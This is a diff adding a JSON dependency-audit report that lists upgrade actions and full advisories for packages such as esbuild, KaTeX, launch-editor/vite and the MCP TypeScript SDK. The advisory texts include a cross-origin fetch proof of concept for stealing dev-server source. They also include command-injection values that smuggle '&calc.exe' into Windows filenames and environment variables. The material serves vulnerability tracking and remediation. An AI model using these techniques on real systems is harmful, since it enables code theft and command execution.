@@ -1,0 +1,1840 @@
+{
+  "actions": [
+    {
+      "isMajor": true,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 1090893,
+          "path": "cli",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "cli",
+      "target": "1.0.1"
+    },
+    {
+      "isMajor": true,
+      "action": "install",
+      "resolves": [
+        {
+          "id": 1243079,
+          "path": "server>@chat-adapter/discord>discord.js>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243083,
+          "path": "server>multer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243111,
+          "path": "server>@chat-adapter/teams>@microsoft/teams.apps>@azure/msal-node",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243114,
+          "path": "server>@chat-adapter/discord>discord.js>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "server",
+      "target": "1.0.42"
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1102341,
+          "path": "server>better-auth>drizzle-kit>@esbuild-kit/esm-loader>@esbuild-kit/core-utils>esbuild",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": "server>better-auth>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242769,
+          "path": "server>better-auth>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1242625,
+          "path": "server>better-auth>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242654,
+          "path": "server>better-auth>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242661,
+          "path": "server>better-auth>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242727,
+          "path": "server>better-auth>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242733,
+          "path": "server>better-auth>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242736,
+          "path": "server>better-auth>vitest>vite",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "vite",
+      "target": "8.3.5",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1242883,
+          "path": "packages__adapters__claude-local>@modelcontextprotocol/sdk>express-rate-limit>ip-address",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "ip-address",
+      "target": "10.7.5",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1243077,
+          "path": "server>jsdom>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243080,
+          "path": "server>jsdom>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243112,
+          "path": "server>jsdom>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "undici",
+      "target": "8.12.3",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1243098,
+          "path": "packages__paperclip-runner>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243101,
+          "path": "packages__paperclip-runner>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243104,
+          "path": "packages__paperclip-runner>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243107,
+          "path": "packages__paperclip-runner>ajv>fast-uri",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "fast-uri",
+      "target": "3.1.9",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "katex",
+      "resolves": [
+        {
+          "id": 1241206,
+          "path": "ui>mermaid>katex",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "postcss-selector-parser",
+      "resolves": [
+        {
+          "id": 1241232,
+          "path": "ui>@tailwindcss/typography>postcss-selector-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "@modelcontextprotocol/sdk",
+      "resolves": [
+        {
+          "id": 1242628,
+          "path": "packages__adapters__claude-local>@modelcontextprotocol/sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242630,
+          "path": "packages__adapters__claude-local>@modelcontextprotocol/sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242649,
+          "path": "packages__adapters__claude-local>@modelcontextprotocol/sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242667,
+          "path": "packages__adapters__claude-local>@modelcontextprotocol/sdk",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "zod",
+      "resolves": [
+        {
+          "id": 1243066,
+          "path": "packages__adapters__cursor-cloud>@cursor/sdk>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1090893": {
+      "findings": [
+        {
+          "version": "0.3.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2016-10538\n- https://github.com/node-js-libs/cli/issues/81\n- https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=809252\n- https://github.com/advisories/GHSA-6cpc-mj5c-m9rq\n- https://www.npmjs.com/advisories/95",
+      "created": "2019-02-18T23:40:03.000Z",
+      "id": 1090893,
+      "npm_advisory_id": null,
+      "overview": "Affected versions of `cli` use predictable temporary file names. If an attacker can create a symbolic link at the location of one of these temporarly file names, the attacker can arbitrarily write to any file that the user which owns the `cli` process has permission to write to.\n\n\n## Proof of Concept\n\nBy creating Symbolic Links at the following locations, the target of the link can be written to.\n```\nlock_file = '/tmp/' + cli.app + '.pid',\nlog_file = '/tmp/' + cli.app + '.log';\n```\n\n\n## Recommendation\n\nUpdate to version 1.0.0 or later.",
+      "reported_by": null,
+      "title": "Arbitrary File Write in cli",
+      "metadata": null,
+      "cves": [
+        "CVE-2016-10538"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "cli",
+      "vulnerable_versions": "<1.0.0",
+      "github_advisory_id": "GHSA-6cpc-mj5c-m9rq",
+      "recommendation": "Upgrade to version 1.0.0 or later",
+      "patched_versions": ">=1.0.0",
+      "updated": "2023-01-09T05:02:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-6cpc-mj5c-m9rq"
+    },
+    "1102341": {
+      "findings": [
+        {
+          "version": "0.18.20",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "server > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20",
+            "ui > better-auth@1.7.2 > drizzle-kit@0.31.10 > @esbuild-kit/esm-loader@2.6.5 > @esbuild-kit/core-utils@3.3.2 > esbuild@0.18.20"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/evanw/esbuild/security/advisories/GHSA-67mh-4wv8-2f99\n- https://github.com/evanw/esbuild/commit/de85afd65edec9ebc44a11e245fd9e9a2e99760d\n- https://github.com/advisories/GHSA-67mh-4wv8-2f99",
+      "created": "2025-02-10T17:48:07.000Z",
+      "id": 1102341,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nesbuild allows any websites to send any request to the development server and read the response due to default CORS settings.\n\n### Details\n\nesbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.\n\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121\nhttps://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363\n\n**Attack scenario**:\n\n1. The attacker serves a malicious web page (`http://malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `/index.html`: normally you have a script tag here\n- Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",
+      "reported_by": null,
+      "title": "esbuild enables any website to send any requests to the development server and read the response",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "esbuild",
+      "vulnerable_versions": "<=0.24.2",
+      "github_advisory_id": "GHSA-67mh-4wv8-2f99",
+      "recommendation": "Upgrade to version 0.25.0 or later",
+      "patched_versions": ">=0.25.0",
+      "updated": "2025-02-10T17:48:08.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-346"
+      ],
+      "url": "https://github.com/advisories/GHSA-67mh-4wv8-2f99"
+    },
+    "1241206": {
+      "findings": [
+        {
+          "version": "0.16.47",
+          "paths": [
+            "ui > mermaid@11.17.2 > katex@0.16.47"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-238p-pmpm-9mq7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-103923\n- https://github.com/KaTeX/KaTeX/pull/4260\n- https://github.com/KaTeX/KaTeX/commit/0adf7e77db6915d991803b29699f82b1ccf8d4f4\n- https://github.com/KaTeX/KaTeX/releases/tag/v0.18.2\n- https://github.com/advisories/GHSA-238p-pmpm-9mq7",
+      "created": "2026-10-05T23:41:05.000Z",
+      "id": 1241206,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nKaTeX can act as a read-side prototype pollution gadget in applications where `Object.prototype` has already been polluted, or where an attacker can influence the prototype of the renderer options object. (KaTeX does not enable said prototype pollution. This advisory applies when combining KaTeX with other vulnerable software that allows for prototype pollution.)\n\nAffected versions may treat inherited properties from `Object.prototype` as renderer options, internal setting metadata, or namespace entries. In particular, an inherited `trust` value will be treated as though the application explicitly enabled trusted rendering, rather than using the documented default of `false`.\n\nWith attacker-controlled mathematical expressions, this can produce links capable of user-interaction cross-site scripting or load attacker-selected external resources. Exploitation requires the consuming application to insert KaTeX output into a web page without a separate sanitizer. (KaTeX does not execute scripts merely by rendering an expression.)\n\nOther inherited settings can alter rendering behavior or resource limits. Inherited setting metadata can affect how defaults and supplied options are processed, while inherited namespace properties can be mistaken for defined macros or other internal values.\n\n### Patches\n\nUpgrade to KaTeX v0.18.2 to remove this vulnerability.\n\n### Workarounds\n\n- Address any prototype-pollution vulnerability in the application or its dependencies.\n- `delete Object.prototype.trust`, `delete Object.prototype.default`, and `delete Object.prototype.processor` before calling KaTeX\n- Do not allow untrusted input to control the renderer options object or its prototype.\n- Sanitize KaTeX-generated HTML before inserting it into a document.\n\n### Details\n\nKaTeX previously used ordinary JavaScript property access in the following contexts:\n\n- Renderer settings could be inherited from the prototype of the options object.\n- Internal `default` and `processor` setting metadata could be inherited from `Object.prototype`.\n- Namespace lookup could treat inherited properties as built-in definitions.\n- Namespace group restoration could preserve an inherited property as though it had been an explicitly defined value.\n\nThe fix adds own-property checks to each of these paths. Inherited properties are no longer accepted as renderer settings, setting metadata, namespace definitions, or values to be restored after a group ends.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n- Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)",
+      "reported_by": null,
+      "title": "KaTeX: Existing prototype pollution can bypass trust restrictions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-103923"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "katex",
+      "vulnerable_versions": ">=0.11.0 <0.18.2",
+      "github_advisory_id": "GHSA-238p-pmpm-9mq7",
+      "recommendation": "Upgrade to version 0.18.2 or later",
+      "patched_versions": ">=0.18.2",
+      "updated": "2026-10-05T23:41:06.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-807"
+      ],
+      "url": "https://github.com/advisories/GHSA-238p-pmpm-9mq7"
+    },
+    "1241232": {
+      "findings": [
+        {
+          "version": "6.0.10",
+          "paths": [
+            "ui > @tailwindcss/typography@0.5.20 > postcss-selector-parser@6.0.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss-selector-parser/security/advisories/GHSA-rj75-hqrm-r3gf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104844\n- https://github.com/postcss/postcss-selector-parser/commit/62b191792df0a0bc56062e5a875bc74aae2a51cd\n- https://github.com/postcss/postcss-selector-parser/releases/tag/7.1.6\n- https://github.com/advisories/GHSA-rj75-hqrm-r3gf",
+      "created": "2026-10-05T22:53:54.000Z",
+      "id": 1241232,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as\n`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id\nindexes. Three passes scanned those index arrays linearly for every index,\nmaking the parse O(n^2) in the number of indexes rather than in input length:\n`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.\nParsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a\nsingle thread. A benign selector of identical byte size parses in tens of\nmilliseconds, so the cost is driven by the index count, not the input size.\nThe nesting depth of such a selector is 0, so the `maxNestingDepth` guard added\nin 7.1.3 offers no protection.\n\nReachability is deployment dependent. Only consumers that parse untrusted,\nattacker-supplied selectors synchronously in a request path are exposed, for\nexample CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary\nbuild-time use on trusted sources is not affected.\n\n### Patches\n\nFixed in 7.1.6. The three passes now use Set membership tests, making parsing\nlinear in the number of indexes. There is no behaviour change: parsing is\nbyte-identical on a differential corpus of 8413 selectors.\n\n### Workarounds\n\nCap the size of selectors accepted from untrusted sources before parsing.",
+      "reported_by": null,
+      "title": "PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104844"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss-selector-parser",
+      "vulnerable_versions": "<7.1.6",
+      "github_advisory_id": "GHSA-rj75-hqrm-r3gf",
+      "recommendation": "Upgrade to version 7.1.6 or later",
+      "patched_versions": ">=7.1.6",
+      "updated": "2026-10-05T22:53:57.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-rj75-hqrm-r3gf"
+    },
+    "1242625": {
+      "findings": [
+        {
+          "version": "8.2.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/launch-editor/security/advisories/GHSA-698v-4r3x-3vcv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112943\n- https://github.com/vitejs/launch-editor/pull/155\n- https://github.com/vitejs/launch-editor/commit/3c2f9bf2ff8fe63d056a8f9cc52d825b66ca79fc\n- https://github.com/vitejs/launch-editor/releases/tag/v2.14.2\n- https://github.com/advisories/GHSA-698v-4r3x-3vcv",
+      "created": "2026-10-20T18:30:24.000Z",
+      "id": 1242625,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`launch-editor` did not escape `%` on Windows when passing an argument to `cmd`. When an environment variable contained a malicious value, it was possible that that content to be executed.\n\n### Impact\n\nOnly apps that match all of the following conditions are affected:\n\n- The user uses Windows\n- An attacker can place a file with the malicious filename containing `&` or `%`\n- Either of\n  - An attacker can inject an environment variable with a malicious value\n  - An attacker can add a NTFS alternate data stream to the file placed\n\n### Details\n\nUnlike `.sh` files, `.bat` / `.cmd` files on Windows cannot be called directly using [`child_process.spawn`](https://nodejs.org/docs/latest-v24.x/api/child_process.html#child_processspawncommand-args-options) and requires passing them as an argument of `cmd.exe`. To do so, launch-editor escapes the arguments passed to `cmd.exe`. But `launch-editor` did not escape `%` which is used for environment variables.\n\nBecause `launch-editor` checks if the argument matches an existing filename, the attack requires the attacker to be able to place a file.\n\n- If the attacker can inject an environment variable as well, they can include the subcommand in the env variable (e.g. set ` &calc.exe ` to `%ENV%`) and call `launchEditor` with `something%ENV%`.\n- If the attacker can place a NTFS alternate data stream to the file (e.g. a NTFS alternate data stream named `~-38%calc.exe`), they can call `launchEditor` with `something %CMDCMDLINE:~-38%calc.exe`.\n- If the attacker can create a filename containing the `%CD%` and the subcommand (e.g. `&calc.exe `), they can call `launchEditor` with `./%CD%`",
+      "reported_by": null,
+      "title": "launch-editor: escapeCmdArgs() omits % escaping on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112943"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.2.0 <=8.2.3",
+      "github_advisory_id": "GHSA-698v-4r3x-3vcv",
+      "recommendation": "Upgrade to version 8.2.4 or later",
+      "patched_versions": ">=8.2.4",
+      "updated": "2026-10-20T18:30:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-698v-4r3x-3vcv"
+    },
+    "1242628": {
+      "findings": [
+        {
+          "version": "1.31.0",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qw\n- https://github.com/modelcontextprotocol/typescript-sdk/pull/2925\n- https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa\n- https://github.com/advisories/GHSA-22jm-h49p-29qw",
+      "created": "2026-10-20T18:26:54.000Z",
+      "id": 1242628,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nIn affected versions, the experimental tasks feature (`taskStore`) did not check which session created a task. Clients sharing one `InMemoryTaskStore` could list, read and cancel each other's tasks.\n\nExperimental tasks are deprecated. The 2026-07-28 specification replaced them with a redesigned extension. The best course of action is to stop using them.\n\n### Am I affected?\nOnly if your HTTP server passes `taskStore` to `McpServer` or `Server`. If `grep -ri taskstore --exclude-dir=node_modules .` finds nothing, you are not affected.\n\nAffected versions: `@modelcontextprotocol/sdk` 1.24.0 through 1.31.0. The 2.x packages are not affected.\n\n### Fix\nUpgrade to `@modelcontextprotocol/sdk` 1.32.0 or later. Each task is now tied to the session that created it, so a client that starts a new session can no longer reach its earlier tasks.\n\nIf you cannot upgrade yet, remove `taskStore`, or create one `InMemoryTaskStore` per session.",
+      "reported_by": null,
+      "title": "MCP TypeScript SDK: Experimental tasks were not tied to the session that created them",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111767"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@modelcontextprotocol/sdk",
+      "vulnerable_versions": ">=1.24.0 <1.32.0",
+      "github_advisory_id": "GHSA-22jm-h49p-29qw",
+      "recommendation": "Upgrade to version 1.32.0 or later",
+      "patched_versions": ">=1.32.0",
+      "updated": "2026-10-20T18:26:55.000Z",
+      "cvss": {
+        "score": 8.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-639",
+        "CWE-862"
+      ],
+      "url": "https://github.com/advisories/GHSA-22jm-h49p-29qw"
+    },
+    "1242630": {
+      "findings": [
+        {
+          "version": "1.31.0",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0",
